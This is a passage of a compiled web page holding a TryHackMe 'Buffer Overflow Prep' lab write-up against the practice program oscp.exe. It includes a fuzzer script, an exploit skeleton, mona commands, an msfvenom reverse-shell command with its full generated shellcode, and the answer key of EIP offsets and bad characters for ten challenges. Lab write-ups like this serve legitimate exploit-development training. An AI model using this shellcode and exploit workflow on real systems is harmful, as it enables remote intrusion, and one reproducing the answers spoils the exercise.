(C:\\Users\\Admin\\Desktop\\Buffer Overflow Prep\\oscp\\essfunc.dll)\n0BADF00D       Found a total of 9 pointers\n0BADF00D\n0BADF00D   [+] This mona.py action took 0:00:05.802000\n")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"625011AF")),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"Generate Payload")),(0,o.kt)("p",null,"Run the following msfvenom command on Kali, using your Kali VPN IP as the LHOST and updating the -b option with all the badchars you identified (including \\x00):"),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},'msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "\\x00" -f py')),(0,o.kt)("p",null,"Copy the generated python code and integrate it into your exploit.py script, e.g. by setting the payload variable equal to the buf variable from the code."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},'buf =  b""\nbuf += b"\\xbd\\x85\\x24\\xdf\\x95\\xd9\\xe8\\xd9\\x74\\x24\\xf4\\x5f\\x31"\nbuf += b"\\xc9\\xb1\\x52\\x83\\xc7\\x04\\x31\\x6f\\x0e\\x03\\xea\\x2a\\x3d"\nbuf += b"\\x60\\x08\\xda\\x43\\x8b\\xf0\\x1b\\x24\\x05\\x15\\x2a\\x64\\x71"\nbuf += b"\\x5e\\x1d\\x54\\xf1\\x32\\x92\\x1f\\x57\\xa6\\x21\\x6d\\x70\\xc9"\nbuf += b"\\x82\\xd8\\xa6\\xe4\\x13\\x70\\x9a\\x67\\x90\\x8b\\xcf\\x47\\xa9"\nbuf += b"\\x43\\x02\\x86\\xee\\xbe\\xef\\xda\\xa7\\xb5\\x42\\xca\\xcc\\x80"\nbuf += b"\\x5e\\x61\\x9e\\x05\\xe7\\x96\\x57\\x27\\xc6\\x09\\xe3\\x7e\\xc8"\nbuf += b"\\xa8\\x20\\x0b\\x41\\xb2\\x25\\x36\\x1b\\x49\\x9d\\xcc\\x9a\\x9b"\nbuf += b"\\xef\\x2d\\x30\\xe2\\xdf\\xdf\\x48\\x23\\xe7\\x3f\\x3f\\x5d\\x1b"\nbuf += b"\\xbd\\x38\\x9a\\x61\\x19\\xcc\\x38\\xc1\\xea\\x76\\xe4\\xf3\\x3f"\nbuf += b"\\xe0\\x6f\\xff\\xf4\\x66\\x37\\x1c\\x0a\\xaa\\x4c\\x18\\x87\\x4d"\nbuf += b"\\x82\\xa8\\xd3\\x69\\x06\\xf0\\x80\\x10\\x1f\\x5c\\x66\\x2c\\x7f"\nbuf += b"\\x3f\\xd7\\x88\\xf4\\xd2\\x0c\\xa1\\x57\\xbb\\xe1\\x88\\x67\\x3b"\nbuf += b"\\x6e\\x9a\\x14\\x09\\x31\\x30\\xb2\\x21\\xba\\x9e\\x45\\x45\\x91"\nbuf += b"\\x67\\xd9\\xb8\\x1a\\x98\\xf0\\x7e\\x4e\\xc8\\x6a\\x56\\xef\\x83"\nbuf += b"\\x6a\\x57\\x3a\\x03\\x3a\\xf7\\x95\\xe4\\xea\\xb7\\x45\\x8d\\xe0"\nbuf += b"\\x37\\xb9\\xad\\x0b\\x92\\xd2\\x44\\xf6\\x75\\x1d\\x30\\x4a\\xbc"\nbuf += b"\\xf5\\x43\\xaa\\xae\\x59\\xcd\\x4c\\xba\\x71\\x9b\\xc7\\x53\\xeb"\nbuf += b"\\x86\\x93\\xc2\\xf4\\x1c\\xde\\xc5\\x7f\\x93\\x1f\\x8b\\x77\\xde"\nbuf += b"\\x33\\x7c\\x78\\x95\\x69\\x2b\\x87\\x03\\x05\\xb7\\x1a\\xc8\\xd5"\nbuf += b"\\xbe\\x06\\x47\\x82\\x97\\xf9\\x9e\\x46\\x0a\\xa3\\x08\\x74\\xd7"\nbuf += b"\\x35\\x72\\x3c\\x0c\\x86\\x7d\\xbd\\xc1\\xb2\\x59\\xad\\x1f\\x3a"\nbuf += b"\\xe6\\x99\\xcf\\x6d\\xb0\\x77\\xb6\\xc7\\x72\\x21\\x60\\xbb\\xdc"\nbuf += b"\\xa5\\xf5\\xf7\\xde\\xb3\\xf9\\xdd\\xa8\\x5b\\x4b\\x88\\xec\\x64"\nbuf += b"\\x64\\x5c\\xf9\\x1d\\x98\\xfc\\x06\\xf4\\x18\\x1c\\xe5\\xdc\\x54"\nbuf += b"\\xb5\\xb0\\xb5\\xd4\\xd8\\x42\\x60\\x1a\\xe5\\xc0\\x80\\xe3\\x12"\nbuf += b"\\xd8\\xe1\\xe6\\x5f\\x5e\\x1a\\x9b\\xf0\\x0b\\x1c\\x08\\xf0\\x19"\n')),(0,o.kt)("p",null,"Prepend NOPs"),(0,o.kt)("p",null,'Since an encoder was likely used to generate the payload, you will need some space in memory for the payload to unpack itself. You can do this by setting the padding variable to a string of 16 or more "No Operation" (\\x90) bytes:'),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},'padding = "\\x90" * 16')),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"Exploit!")),(0,o.kt)("p",null,"With the correct prefix, offset, return address, padding, and payload set, you can now exploit the buffer overflow to get a reverse shell."),(0,o.kt)("p",null,"Start a netcat listener on your Kali box using the LPORT you specified in the msfvenom command (4444 if you didn't change it)."),(0,o.kt)("p",null,"Restart oscp.exe in Immunity and run the modified exploit.py script again. Your netcat listener should catch a reverse shell!"),(0,o.kt)("p",null,"What is the EIP offset for OVERFLOW1?"),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"1978")),(0,o.kt)("p",null,"In byte order (e.g. \\x00\\x01\\x02) and including the null byte \\x00, what were the badchars for OVERFLOW1?"),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"\\x00\\x07\\x2e\\xa0")),(0,o.kt)("h2",{id:"task-3-oscpexe---overflow2"},"Task 3 oscp.exe - OVERFLOW2"),(0,o.kt)("p",null,"Repeat the steps outlined in Task 2 but for the OVERFLOW2 command."),(0,o.kt)("p",null,"What is the EIP offset for OVERFLOW2?"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-py"},'import socket, time, sys\n\nip = "192.168.178.56"\nport = 1337\ntimeout = 5\n\nbuffer = []\ncounter = 100\nwhile len(buffer) < 30:\n    buffer.append("A" * counter)\n    counter += 100\n\nfor string in buffer:\n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.settimeout(timeout)\n        connect = s.connect((ip, port))\n        s.recv(1024)\n        print("Fuzzing with %s bytes" % len(string))\n        s.send("OVERFLOW2 " + string + "\\r\\n")\n        s.recv(1024)\n        s.close()\n    except:\n        print("Could not connect to " + ip + ":" + str(port))\n        sys.exit(0)\n    time.sleep(1)\n')),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Buffer Overflow Prep$ python fuzzer.py\nFuzzing with 100 bytes\nFuzzing with 200 bytes\nFuzzing with 300 bytes\nFuzzing with 400 bytes\nFuzzing with 500 bytes\nFuzzing with 600 bytes\nFuzzing with 700 bytes\nCould not connect to 192.168.178.56:1337\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-py"},'import socket\n\nip = "192.168.178.56"\nport = 1337\n\nprefix = "OVERFLOW2 "\noffset = 0\noverflow = "A" * offset\nretn = ""\npadding = ""\npayload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2B"\npostfix = ""\n\nbuffer = prefix + overflow + retn + padding + payload + postfix\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\ntry:\n    s.connect((ip, port))\n    print("Sending evil buffer...")\n    s.send(buffer + "\\r\\n")\n    print("Done!")\nexcept:\n    print("Could not connect.")\n')),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Buffer Overflow Prep$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1300\nAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2B\n")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"!mona findmsp -distance 1300")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"0BADF00D   [+] Examining registers\n0BADF00D       EIP contains normal pattern : 0x76413176 (offset 634)\n")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"634")),(0,o.kt)("p",null,"In byte order (e.g. \\x00\\x01\\x02) and including the null byte \\x00, what were the badchars for OVERFLOW2?"),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},'!mona bytearray -b "\\x00"')),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"!mona compare -f bytearray.bin -a 00E9FA18")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"\\x00\\x23\\x3c\\x83\\xba")),(0,o.kt)("h2",{id:"task-4-oscpexe---overflow3"},"Task 4 oscp.exe - OVERFLOW3"),(0,o.kt)("p",null,"Repeat the steps outlined in Task 2 but for the OVERFLOW3 command."),(0,o.kt)("p",null,"What is the EIP offset for OVERFLOW3?"),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"1274")),(0,o.kt)("p",null,"In byte order (e.g. \\x00\\x01\\x02) and including the null byte \\x00, what were the badchars for OVERFLOW3?"),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"\\x00\\x11\\x40\\x5f\\xb8\\xee")),(0,o.kt)("h2",{id:"task-5-oscpexe---overflow4"},"Task 5 oscp.exe - OVERFLOW4"),(0,o.kt)("p",null,"Repeat the steps outlined in Task 2 but for the OVERFLOW4 command."),(0,o.kt)("p",null,"What is the EIP offset for OVERFLOW4?"),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"2026")),(0,o.kt)("p",null,"In byte order (e.g. \\x00\\x01\\x02) and including the null byte \\x00, what were the badchars for OVERFLOW4?"),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"\\x00\\xa9\\xcd\\xd4")),(0,o.kt)("h2",{id:"task-6-oscpexe---overflow5"},"Task 6 oscp.exe - OVERFLOW5"),(0,o.kt)("p",null,"Repeat the steps outlined in Task 2 but for the OVERFLOW5 command."),(0,o.kt)("p",null,"What is the EIP offset for OVERFLOW5?"),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"314")),(0,o.kt)("p",null,"In byte order (e.g. \\x00\\x01\\x02) and including the null byte \\x00, what were the badchars for OVERFLOW5?"),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"\\x00\\x16\\x2f\\xf4\\xfd")),(0,o.kt)("h2",{id:"task-7-oscpexe---overflow6"},"Task 7 oscp.exe - OVERFLOW6"),(0,o.kt)("p",null,"Repeat the steps outlined in Task 2 but for the OVERFLOW6 command."),(0,o.kt)("p",null,"What is the EIP offset for OVERFLOW6?"),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"1034")),(0,o.kt)("p",null,"In byte order (e.g. \\x00\\x01\\x02) and including the null byte \\x00, what were the badchars for OVERFLOW6?"),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"\\x00\\x08\\x2c\\xad")),(0,o.kt)("h2",{id:"task-8-oscpexe---overflow7"},"Task 8 oscp.exe - OVERFLOW7"),(0,o.kt)("p",null,"Repeat the steps outlined in Task 2 but for the OVERFLOW7 command."),(0,o.kt)("p",null,"What is the EIP offset for OVERFLOW7?"),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"1306")),(0,o.kt)("p",null,"In byte order (e.g. \\x00\\x01\\x02) and including the null byte \\x00, what were the badchars for OVERFLOW7?"),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"\\x00\\x8c\\xae\\xbe\\xfb")),(0,o.kt)("h2",{id:"task-9-oscpexe---overflow8"},"Task 9 oscp.exe - OVERFLOW8"),(0,o.kt)("p",null,"Repeat the steps outlined in Task 2 but for the OVERFLOW8 command."),(0,o.kt)("p",null,"What is the EIP offset for OVERFLOW8?"),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"1786")),(0,o.kt)("p",null,"In byte order (e.g. \\x00\\x01\\x02) and including the null byte \\x00, what were the badchars for OVERFLOW8?"),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"\\x00\\x1d\\x2e\\xc7\\xee")),(0,o.kt)("h2",{id:"task-10-oscpexe---overflow9"},"Task 10 oscp.exe - OVERFLOW9"),(0,o.kt)("p",null,"Repeat the steps outlined in Task 2 but for the OVERFLOW9 command."),(0,o.kt)("p",null,"What is the EIP offset for OVERFLOW9?"),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"1514")),(0,o.kt)("p",null,"In byte order (e.g. \\x00\\x01\\x02) and including the null byte \\x00, what were the badchars for OVERFLOW9?"),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"\\x00\\x04\\x3e\\x3f\\xe1")),(0,o.kt)("h2",{id:"task-11-oscpexe---overflow10"},"Task 11 oscp.exe - OVERFLOW10"),(0,o.kt)("p",null,"Repeat the steps outlined in Task 2 but for the OVERFLOW10 command."),(0,o.kt)("p",null,"What is the EIP offset for OVERFLOW10?"),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"537")),(0,o.kt)("p",null,"In byte order (e.g. \\x00\\x01\\x02) and including the null byte \\x00, what were the badchars for OVERFLOW10?"),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"\\x00\\xa0\\xad\\xbe\\xde\\xef")))}u.isMDXComponent=!0},63922:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/2020-11-19_16-10-182a0ccc25bfc943b92601843d627cc5.png"},54662:(e,t,n)=>{n.d(t,{Z:()=>a});const a="data:image/png;base64,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"}}]);